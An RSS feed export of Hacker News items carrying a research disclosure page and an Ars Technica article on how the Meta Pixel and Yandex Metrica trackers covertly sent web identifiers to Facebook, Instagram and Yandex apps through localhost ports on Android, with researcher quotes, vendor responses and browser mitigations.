<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 03 Jun 2025 15:30:02 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Covert Web-to-App Tracking via Localhost on Android (116 pts)]]></title>
            <link>https://localmess.github.io/</link>
            <guid>44169314</guid>
            <pubDate>Tue, 03 Jun 2025 12:35:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://localmess.github.io/">https://localmess.github.io/</a>, See on <a href="https://news.ycombinator.com/item?id=44169314">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="intro">
                
                
                <p><img src="https://localmess.github.io/assets/img/websites-app-ID-sharing.png" alt="Web-to-native ID sharing"></p><p>We disclose a novel tracking method by Meta and Yandex potentially affecting
                    billions of Android users. We found that native Android apps‚Äîincluding <strong>Facebook,
                        Instagram</strong>, and
                    several <strong>Yandex apps including Maps and Browser‚Äîsilently listen on fixed local
                        ports</strong> for tracking purposes. </p>
                <p>These native Android apps receive browsers' metadata, cookies and commands from
                    the Meta Pixel and Yandex Metrica scripts embedded on thousands of web sites. These JavaScripts load
                    on users' mobile browsers and silently connect with native apps running on the same device through
                    localhost sockets. As native apps access programatically
                    device identifiers like the <a href="https://support.google.com/googleplay/android-developer/answer/6048248">Android
                        Advertising ID (AAID)</a> or handle user identities as in the case
                    of Meta apps, this method effectively allows these organizations to <strong>link mobile
                        browsing sessions and web cookies to user identities</strong>, hence de-anonymizing users'
                    visiting sites embedding their scripts.</p>
                <p>This web-to-app ID sharing method bypasses typical privacy protections such as clearing
                    cookies, Incognito Mode and Android's permission controls. Worse, it opens the door for potentially
                    malicious apps eavesdropping on users‚Äô web activity.
                </p>
                

                <hr>
            </div><div>
            <details id="resources">
                <summary>üìÅ Additional Resources</summary>
                <p>- Video showing Yandex sending localhost requests. The left window shows a
                    remote debugging inspector window of the browser on the Android phone.
                    The right window shows the screen of the Android phone, with our proof-of-concept app at the top and
                    the browser at the bottom:</p>
                <video controls="" src="https://localmess.github.io/assets/video/Yandex_sending_web_compressed.mp4">Your browser does not
                    support the video tag.</video>
                
                <p>- Video showing Meta Pixel sending localhost STUN requests. The left window
                    shows Wireshark, a program that monitors web traffic.
                    The right window shows the browser visiting a website. Note that the requests only start sending
                    once the page is loaded when emulating a Android phone (Pixel 7)
                    and the breakpoint added to the Facebook script is passed:</p>
                <video controls="" src="https://localmess.github.io/assets/video/FB_sending_web_compressed.mp4">Your browser does not support the video tag.</video>
                <p>- Image showing Meta Pixel parameters for which ports and protocols to
                    contact localhost.</p>
                <img src="https://localmess.github.io/assets/img/fb_pixel_ports.png">
                <p>- Image showing Meta Pixel performing SDP Munging to insert the _fbp cookie
                    value.</p>
                <img src="https://localmess.github.io/assets/img/fb_sdp_munging_red.png">
                <p>- Image showing Meta Pixel using STUN to _pass fbp cookie value to mobile
                    apps.</p>
                <img src="https://localmess.github.io/assets/img/fb_stun.png">
            </details>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Meta and Yandex are de-anonymizing Android users' web browsing identifiers (203 pts)]]></title>
            <link>https://arstechnica.com/security/2025/06/headline-to-come/</link>
            <guid>44169115</guid>
            <pubDate>Tue, 03 Jun 2025 12:12:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/security/2025/06/headline-to-come/">https://arstechnica.com/security/2025/06/headline-to-come/</a>, See on <a href="https://news.ycombinator.com/item?id=44169115">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
            <article data-id="2098088">
  
  <header>
  <div>
    

    

    <p>
      Abuse allows Meta and Yandex to attach persistent identifiers to detailed browsing histories.
    </p>

    

    <div>
            <p><a data-pswp-width="2560" data-pswp-height="1440" data-pswp-srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars.jpg 2560w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-640x360.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-1024x576.jpg 1024w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-768x432.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-1536x864.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-2048x1152.jpg 2048w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-384x216.jpg 384w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-1152x648.jpg 1152w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-980x551.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-1440x810.jpg 1440w" data-cropped="false" href="https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars.jpg" target="_blank">
              <img width="2560" height="1440" src="https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars.jpg" alt="" loading="eager" decoding="async" fetchpriority="high" srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars.jpg 2560w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-640x360.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-1024x576.jpg 1024w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-768x432.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-1536x864.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-2048x1152.jpg 2048w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-384x216.jpg 384w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-1152x648.jpg 1152w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-980x551.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/android-tracking-binoculars-1440x810.jpg 1440w" sizes="(max-width: 2560px) 100vw, 2560px">
            </a></p><div id="caption-2098181">
    
    <p><span>
          Credit:

          
          Aurich Lawson | Getty Images

                  </span>
          </p>
  </div>
          </div>

    <div>
    
    <p><span>
          Credit:

          
          Aurich Lawson | Getty Images

                  </span>
          </p>
  </div>
  </div>
</header>


  

  
      
    
    <div>
                      
                      
          
<p>Tracking code that Meta and Russia-based Yandex embed into millions of websites is de-anonymizing visitors by abusing legitimate Internet protocols, causing Chrome and other browsers to surreptitiously send unique identifiers to native apps installed on a device, <a href="https://localmess.github.io/">researchers have discovered</a>. Google says it's investigating the abuse, which allows Meta and Yandex to convert ephemeral web identifiers into persistent mobile app user identities.</p>
<p>The covert tracking‚Äîimplemented in the <a href="https://www.facebook.com/business/tools/meta-pixel/">Meta Pixel</a> and <a href="https://ads.yandex/metrica">Yandex Metrica</a> trackers‚Äîallows Meta and Yandex to bypass core security and privacy protections provided by both the Android operating system and browsers that run on it. <a href="https://source.android.com/docs/security/app-sandbox">Android sandboxing</a>, for instance, isolates processes to prevent them from interacting with the OS and any other app installed on the device, cutting off access to sensitive data or privileged system resources. Defenses such <span>as <a href="https://developer.mozilla.org/en-US/docs/Web/Privacy/Guides/State_Partitioning" target="_blank" rel="noopener">state</a></span><a href="https://developer.mozilla.org/en-US/docs/Web/Privacy/Guides/State_Partitioning">&nbsp;partitioning</a> and <a href="https://privacysandbox.google.com/cookies/storage-partitioning">storage partitioning</a>, which are built into all major browsers, store site cookies and other data associated with a website in containers that are unique to every top-level website domain to ensure they're off-limits for every other site.</p>
<h2>A blatant violation</h2>
<p>‚ÄúOne of the fundamental security principles that exists in the web, as well as the mobile system, is called sandboxing,‚Äù Narseo Vallina-Rodriguez, one of the researchers behind the discovery, said in an interview. ‚ÄúYou run everything in a sandbox, and there is no interaction within different elements running on it. What this attack vector allows is to break the sandbox that exists between the mobile context and the web context. The channel that exists allowed the Android system to communicate what happens in the browser with the identity running in the mobile app.‚Äù</p>
<p>The bypass‚Äîwhich Yandex began in 2017 and Meta started last September‚Äîallows the companies to pass cookies or other identifiers from Firefox and Chromium-based browsers to native Android apps for Facebook, Instagram, and various Yandex apps. The companies can then tie that vast browsing history to the account holder logged into the app.</p>

          
                      
                  </div>
                    
        
          
    
    <div>
          
          
<p>This abuse has been observed only in Android, and evidence suggests that the Meta Pixel and Yandex Metrica target only Android users. The researchers say it may be technically feasible to target iOS because browsers on that platform allow developers to programmatically <a href="https://bugs.webkit.org/show_bug.cgi?id=279249">establish localhost connections</a> that apps can monitor on local ports.</p>
<p>In contrast to iOS, however, Android imposes fewer controls on local host communications and background executions of mobile apps, the researchers said, while also implementing stricter controls in app store vetting processes to limit such abuses. This overly permissive design allows Meta Pixel and Yandex Metrica to send web requests with web tracking identifiers to specific local ports that are continuously monitored by the Facebook, Instagram, and Yandex apps. These apps can then link pseudonymous web identities with actual user identities, even in private browsing modes, effectively de-anonymizing users‚Äô browsing habits on sites containing these trackers.</p>
<p>Meta Pixel and Yandex Metrica are analytics scripts designed to help advertisers measure the effectiveness of their campaigns. Meta Pixel and Yandex Metrica are estimated to be installed on <a href="https://trends.builtwith.com/websitelist/Facebook-Pixel%20">5.8 million</a> and <a href="https://trends.builtwith.com/analytics/Yandex-Metrika">3 million</a> sites, respectively.</p>
<p>Meta and Yandex achieve the bypass by abusing basic functionality built into modern mobile browsers that allows browser-to-native app communications. The functionality lets browsers send web requests to local Android ports to establish various services, including media connections through the <a href="https://en.wikipedia.org/wiki/Real-time_communication">RTC protocol</a>, file sharing, and developer debugging.</p>
<figure>
    <div>
            <p><a data-pswp-width="3226" data-pswp-height="1250" data-pswp-srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing.jpg 3226w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-640x248.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-1024x397.jpg 1024w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-768x298.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-1536x595.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-2048x794.jpg 2048w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-980x380.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-1440x558.jpg 1440w" data-cropped="false" href="https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing.jpg" target="_blank">
              <img width="1024" height="397" src="https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-1024x397.jpg" alt="" decoding="async" loading="lazy" srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-1024x397.jpg 1024w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-640x248.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-768x298.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-1536x595.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-2048x794.jpg 2048w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-980x380.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-web-to-app-id-sharing-1440x558.jpg 1440w" sizes="auto, (max-width: 1024px) 100vw, 1024px">
            </a></p><p>
              A conceptual diagram representing the exchange of identifiers between the web trackers running on the browser context and native Facebook, Instagram, and Yandex apps for Android.
                          </p>
          </div>
          <figcaption>
        <div>
    
    <p>
      A conceptual diagram representing the exchange of identifiers between the web trackers running on the browser context and native Facebook, Instagram, and Yandex apps for Android.

          </p>
  </div>
      </figcaption>
      </figure>

<p>While the technical underpinnings differ, both Meta Pixel and Yandex Metrica are performing a ‚Äúweird protocol misuse‚Äù to gain unvetted access that Android provides to <a href="https://stackoverflow.com/questions/1946193/whats-the-whole-point-of-localhost-hosts-and-ports-at-all">localhost ports</a> on the 127.0.0.1 IP address. Browsers access these ports without user notification. Facebook, Instagram, and Yandex native apps silently listen on those ports, copy identifiers in real time, and link them to the user logged into the app.</p>

          
                  </div>
                    
        
          
    
    <div>
          
          

<p>A representative for Google said the behavior violates the terms of service for its Play marketplace and the privacy expectations of Android users.</p>
<p>‚ÄúThe developers in this report are using capabilities present in many browsers across iOS and Android in unintended ways that blatantly violate our security and privacy principles,‚Äù the representative said, referring to the people who write the Meta Pixel and Yandex Metrica JavaScript. ‚ÄúWe've already implemented changes to mitigate these invasive techniques and have opened our own investigation and are directly in touch with the parties.‚Äù</p>
<p>Meta didn't answer emailed questions for this article, but provided the following statement: "We are in discussions with Google to address a potential miscommunication regarding the application of their policies. Upon becoming aware of the concerns, we decided to pause the feature while we work with Google to resolve the issue."</p>
<p>Yandex representatives didn't answer an email seeking comment.</p>
<h2>How Meta and Yandex de-anonymize Android users</h2>
<p>Meta Pixel developers have abused various protocols to implement the covert listening since the practice began last September. They started by causing apps to send HTTP requests to port 12387. A month later, Meta Pixel stopped sending this data, even though Facebook and Instagram apps continued to monitor the port.</p>
<p>In November, Meta Pixel switched to a new method that invoked WebSocket, a protocol for two-way communications, over port 12387.</p>
<p>That same month, Meta Pixel also deployed a new method that used <a href="https://en.wikipedia.org/wiki/WebRTC">WebRTC</a>, a real-time peer-to-peer communication protocol commonly used for making audio or video calls in the browser. This method used a complicated process known as <a href="https://webrtchacks.com/not-a-guide-to-sdp-munging/">SDP munging</a>, a technique for JavaScript code to modify Session Description Protocol data before it‚Äôs sent. Still in use today, the SDP munging by Meta Pixel inserts key _fbp cookie content into fields meant for connection information. This causes the browser to send that data as part of a <a href="https://en.wikipedia.org/wiki/STUN">STUN request</a> to the Android local host, where the Facebook or Instagram app can read it and link it to the user.</p>

          
                  </div>
                    
        
          
    
    <div>
          
          
<p>In May, a <a href="https://groups.google.com/g/discuss-webrtc/c/PIJZN5MTZF4/m/JHVmmn8yDgAJ?pli=1">beta version</a> of Chrome introduced a mitigation that blocked the type of SDP munging that Meta Pixel used. Within days, Meta Pixel circumvented the mitigation by adding a new method that swapped the STUN requests with the <a href="https://en.wikipedia.org/wiki/Traversal_Using_Relays_around_NAT">TURN requests</a>.</p>
<figure>
    <p><img width="640" height="187" src="https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-pixel-transmitting-fbp-cookie-640x187.jpg" alt="" decoding="async" loading="lazy" srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-pixel-transmitting-fbp-cookie-640x187.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-pixel-transmitting-fbp-cookie-1024x299.jpg 1024w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-pixel-transmitting-fbp-cookie-768x224.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-pixel-transmitting-fbp-cookie-1536x448.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-pixel-transmitting-fbp-cookie-2048x598.jpg 2048w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-pixel-transmitting-fbp-cookie-980x286.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-pixel-transmitting-fbp-cookie-1440x420.jpg 1440w" sizes="auto, (max-width: 640px) 100vw, 640px">
                  </p>
      </figure>

<p>In a <a href="https://arstechnica.com/security/2025/06/headline-to-come/link">post</a>, the researchers provided a detailed description of the _fbp cookie from a website to the native app and, from there, to the Meta server:</p>
<blockquote><p>1. The user opens the native Facebook or Instagram app, which eventually is sent to the background and creates a background service to listen for incoming traffic on a TCP port (12387 or 12388) and a UDP port (the first unoccupied port in 12580‚Äì12585). Users must be logged-in with their credentials on the apps.<br>
2. The user opens their browser and visits a website integrating the Meta Pixel.<br>
3. At this stage, some websites wait for users' consent before embedding Meta Pixel. In our measurements of the top 100K website homepages, we found websites that require consent to be a minority (more than 75% of affected sites does not require user consent)...<br>
4. The Meta Pixel script is loaded and the _fbp cookie is sent to the native Instagram or Facebook app via WebRTC (STUN) SDP Munging.<br>
5. The Meta Pixel script also sends the _fbp value in a request to https://www.facebook.com/tr along with other parameters such as page URL (dl), website and browser metadata, and the event type (ev) (e.g., PageView, AddToCart, Donate, Purchase).<br>
6. The Facebook or Instagram apps receive the _fbp cookie from the Meta JavaScripts running on the browser and transmits it to the GraphQL endpoint (https://graph[.]facebook[.]com/graphql) along with other persistent user identifiers, linking users' fbp ID (web visit) with their Facebook or Instagram account.</p></blockquote>
<figure>
    <div>
            <p><a data-pswp-width="1998" data-pswp-height="1714" data-pswp-srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow.jpg 1998w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-640x549.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-1024x878.jpg 1024w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-768x659.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-1536x1318.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-980x841.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-1440x1235.jpg 1440w" data-cropped="false" href="https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow.jpg" target="_blank">
              <img width="1024" height="878" src="https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-1024x878.jpg" alt="" decoding="async" loading="lazy" srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-1024x878.jpg 1024w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-640x549.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-768x659.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-1536x1318.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-980x841.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow-1440x1235.jpg 1440w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/fbp-cookie-transfer-flow.jpg 1998w" sizes="auto, (max-width: 1024px) 100vw, 1024px">
            </a></p><p>
              Detailed flow of the way the Meta Pixel leaks the _fbp cookie from Android browsers to it's Facebook and Instagram apps.
                          </p>
          </div>
          <figcaption>
        <div>
    
    <p>
      Detailed flow of the way the Meta Pixel leaks the _fbp cookie from Android browsers to it's Facebook and Instagram apps.

          </p>
  </div>
      </figcaption>
      </figure>

<p>The first known instance of Yandex Metrica linking websites visited in Android browsers to app identities was in May 2017, when the tracker started sending HTTP requests to local ports 29009 and 30102. In May 2018, Yandex Metrica also began sending the data through HTTPS to ports 29010 and 30103. Both methods remained in place as of publication time.</p>

          
                  </div>
                    
        
          
    
    <div>
          
          

<figure>
    <div>
            <p><a data-pswp-width="2952" data-pswp-height="1614" data-pswp-srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing.jpg 2952w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-640x350.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-1024x560.jpg 1024w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-768x420.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-1536x840.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-2048x1120.jpg 2048w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-980x536.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-1440x787.jpg 1440w" data-cropped="false" href="https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing.jpg" target="_blank">
              <img width="1024" height="560" src="https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-1024x560.jpg" alt="" decoding="async" loading="lazy" srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-1024x560.jpg 1024w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-640x350.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-768x420.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-1536x840.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-2048x1120.jpg 2048w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-980x536.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/yandex-id-sharing-1440x787.jpg 1440w" sizes="auto, (max-width: 1024px) 100vw, 1024px">
            </a></p><p>
              An overview of Yandex identifier sharing
                          </p>
          </div>
          <figcaption>
        <div>
    
    <p>
      An overview of Yandex identifier sharing

          </p>
  </div>
      </figcaption>
      </figure>

<figure>
    <div>
            <p><a data-pswp-width="2180" data-pswp-height="974" data-pswp-srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline.jpg 2180w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-640x286.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-1024x458.jpg 1024w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-768x343.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-1536x686.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-2048x915.jpg 2048w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-980x438.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-1440x643.jpg 1440w" data-cropped="false" href="https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline.jpg" target="_blank">
              <img width="1024" height="458" src="https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-1024x458.jpg" alt="" decoding="async" loading="lazy" srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-1024x458.jpg 1024w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-640x286.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-768x343.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-1536x686.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-2048x915.jpg 2048w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-980x438.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/meta-yandex-tracking-timeline-1440x643.jpg 1440w" sizes="auto, (max-width: 1024px) 100vw, 1024px">
            </a></p><p>
              A timeline of web history tracking by Meta and Yandex
                          </p>
          </div>
          <figcaption>
        <div>
    
    <p>
      A timeline of web history tracking by Meta and Yandex

          </p>
  </div>
      </figcaption>
      </figure>

<p>Some browsers for Android have blocked the abusive JavaScript in trackers. DuckDuckGo, for instance, was already blocking domains and IP addresses associated with the trackers, preventing the browser from sending any identifiers to Meta. The browser also blocked most of the domains associated with Yandex Metrica. After the researchers notified DuckDuckGo of the incomplete blacklist, developers added the missing addresses.</p>
<p>The Brave browser, meanwhile, also blocked the sharing of identifiers due to its extensive blocklists and existing mitigation to <a href="https://brave.com/privacy-updates/27-localhost-permission/" target="_blank" rel="noopener">block requests</a> to the localhost without explicit user consent<span>.</span> Vivaldi, another Chromium-based browser, forwards the identifiers to local Android ports when the default privacy setting is in place. Changing the setting to block trackers appears to thwart browsing history leakage, the researchers said.</p>
<figure>
    <p><img width="300" height="300" src="https://cdn.arstechnica.net/wp-content/uploads/2025/06/vivaldi-setting-300x300.png" alt="" decoding="async" loading="lazy" srcset="https://cdn.arstechnica.net/wp-content/uploads/2025/06/vivaldi-setting-300x300.png 300w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/vivaldi-setting-500x500.png 500w, https://cdn.arstechnica.net/wp-content/uploads/2025/06/vivaldi-setting-1000x1000.png 1000w" sizes="auto, (max-width: 300px) 100vw, 300px">
                  </p>
          <figcaption>
        <div>
    
    <p>
      Tracking blocker settings in Vivaldi for Android.

          </p>
  </div>
      </figcaption>
      </figure>

<h2>There‚Äôs got to be a better way</h2>
<p>The various remedies DuckDuckGo, Brave, Vivaldi, and Chrome have put in place are working as intended, but the researchers caution they could become ineffective at any time.</p>
<p>‚ÄúAny browser doing blocklisting will likely enter into a constant arms race, and it's just a partial solution,‚Äù Vallina Rodriguez said of the current mitigations. ‚ÄúCreating effective blocklists is hard, and browser makers will need to constantly monitor the use of this type of capability to detect other hostnames potentially abusing localhost channels and then updating their blocklists accordingly.‚Äù</p>
<p>He continued:</p>
<blockquote><p>While this solution works once you know the hostnames doing that, it's not the right way of mitigating this issue, as trackers may find ways of accessing this capability (e.g., through more ephemeral hostnames). A long-term solution should go through the design and development of privacy and security controls for localhost channels, so that users can be aware of this type of communication and potentially enforce some control or limit this use (e.g., a permission or some similar user notifications).</p></blockquote>
<p>Chrome and most other Chromium-based browsers executed the JavaScript as Meta and Yandex intended. Firefox did as well, although for reasons that aren't clear, the browser was not able to successfully perform the SDP munging specified in later versions of the code. After blocking the STUN variant of SDP munging in the early May beta release, a production version of Chrome released <a href="https://developer.chrome.com/release-notes/137">two weeks ago</a> began blocking both the STUN and TURN variants. Other Chromium-based browsers are likely to implement it in the coming weeks. Firefox didn't respond to an email asking if it has plans to block the behavior in that browser.</p>

          
                  </div>
                    
        
          
    
    <div>
          
          

<p>The researchers warn that the current fixes are so specific to the code in the Meta and Yandex trackers that it would be easy to bypass them with a simple update.</p>
<p>‚ÄúThey know that if someone else comes in and tries a different port number, they may bypass this protection,‚Äù said Gunes Acar, the researcher behind the initial discovery, referring to the Chrome developer team at Google. ‚ÄúBut our understanding is they want to send this message that they will not tolerate this form of abuse.‚Äù</p>
<p>Fellow researcher Vallina-Rodriguez said the more comprehensive way to prevent the abuse is for Android to overhaul the way it handles access to local ports.</p>
<p>‚ÄúThe fundamental issue is that the access to the local host sockets is completely uncontrolled on Android,‚Äù he explained. ‚ÄúThere's no way for users to prevent this kind of communication on their devices. Because of the dynamic nature of JavaScript code and the difficulty to keep blocklists up to date, the right way of blocking this persistently is by limiting this type of access at the mobile platform and browser level, including stricter platform policies to limit abuse.‚Äù</p>
<h2>Got consent?</h2>
<p>The researchers who made this discovery are:</p>
<ul>
<li>Aniketh Girish, PhD student at <a href="https://networks.imdea.org/">IMDEA Networks</a></li>
<li>Gunes Acar, assistant professor in <a href="https://www.ru.nl/en/institute-for-computing-and-information-sciences">Radboud University‚Äôs</a> Digital Security Group &amp; iHub</li>
<li>Narseo Vallina-Rodriguez, associate professor at IMDEA Networks</li>
<li>Nipuna Weerasekara, PhD student at IMDEA Networks</li>
<li>Tim Vlummens, PhD student at <a href="https://www.esat.kuleuven.be/">COSIC, KU Leuven</a></li>
</ul>
<p>Acar said he first noticed Meta Pixel accessing local ports while visiting his own university's website.</p>
<p>There's no indication that Meta or Yandex has disclosed the tracking to either websites hosting the trackers or end users who visit those sites. Developer forums show that many websites using Meta Pixel were caught off guard when the scripts began connecting to local ports.</p>

          
                  </div>
                    
        
          
    
    <div>

        
        <div>
          
          
<p>‚ÄúSince 5th September, our internal JS error tracking has been flagging failed fetch requests to localhost:12387,‚Äù one developer <a href="https://developers.facebook.com/community/threads/317050484803752/">wrote</a>. ‚ÄúNo changes have been made on our side, and the existing Facebook tracking pixel we use loads via Google Tag Manager.‚Äù</p>
<p>‚ÄúIs there some way I can disable this?‚Äù another developer encountering the unexplained local port access <a href="https://developers.facebook.com/community/threads/937149104821259/">asked</a>.</p>
